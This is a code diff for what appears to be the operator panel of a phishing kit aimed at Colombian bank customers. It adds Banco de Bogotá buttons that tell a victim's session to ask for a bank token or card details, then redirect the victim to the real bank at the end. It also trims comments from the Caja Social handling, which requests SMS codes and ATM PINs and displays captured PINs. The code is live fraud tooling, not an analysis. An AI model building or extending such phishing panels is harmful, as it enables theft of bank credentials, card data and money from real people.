@@ -361,7 +361,6 @@ setInterval(() => {
     });
 }, 1000);
 
-// 🔥 FIX: Ahora detecta cualquier cambio en los datos para actualizar el panel automáticamente 🔥
 function firmaSesiones(lista, activos) {
     const firmaBase = lista.map(s => {
         return s.sessionId + '|' + s.estado + '|' + s.paso + '|' + JSON.stringify(s.datos || {});
@@ -663,6 +662,16 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
+    // 🔥 BOTONES DE BANCO DE BOGOTÁ (ORDEN ESTRICTO) 🔥
+    if (bancoKey === 'bogota') {
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC Bogotá" onclick="accion('${sid}','PEDIR_TARJETA_BOGOTA')">💳</button>`);
+        btns.push(`<button class="btn btn-final" title="Finalizar (Ir a Banco de Bogotá)" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
+
     if (bancoKey === 'bbva') {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
@@ -693,25 +702,16 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 BOTONES DE CAJA SOCIAL (ORDEN ESTRICTO + CLAVE CC PRIMERO SI EXISTE PIN) 🔥
     if (bancoKey === 'caja-social') {
-        // 🔑 Si el usuario ya ingresó el PIN → botón "Clave CC" PRIMERO con los datos
         if (s.datos && s.datos.pin) {
             btns.push(`<button class="btn" style="background:#8b5cf6; color:white; font-weight:900; padding:5px 12px;" title="Clave de CC" onclick="verPinCajaSocial('${sid}')">🔑 Clave CC</button>`);
         }
-        // 1. Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        // 2. Pedir Token
         btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-        // 3. Pedir SMS / OTP
         btns.push(`<button class="btn btn-otp" title="Pedir SMS" onclick="accion('${sid}','OTP')">📱</button>`);
-        // 4. Pedir CC (Tarjeta)
         btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC" onclick="accion('${sid}','PEDIR_TARJETA_CAJA_SOCIAL')">💳</button>`);
-        // 5. Pedir Clave de CC (ATM) → confirmacion.html
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Clave de CC (ATM)" onclick="accion('${sid}','PEDIR_PIN_CAJA_SOCIAL')">🔐</button>`);
-        // 6. Finalizar
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
-        // 7. Bloquear IP
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
@@ -862,7 +862,7 @@ function renderSesiones() {
         }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular' || banco === 'occidente' || banco === 'caja-social';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular' || banco === 'occidente' || banco === 'caja-social' || banco === 'bogota';
         let identificacionTrj = '-';
         let claveFch = '-';
         let cvv = '-';
@@ -1466,7 +1466,6 @@ function verInfoUsuario(sessionId) {
     });
 }
 
-// 🔥 NUEVA FUNCIÓN: modal de Clave CC (ATM) para Caja Social 🔥
 function verPinCajaSocial(sessionId) {
     const s = sesionesCache.find(x => x.sessionId === sessionId);
     if (!s) return;
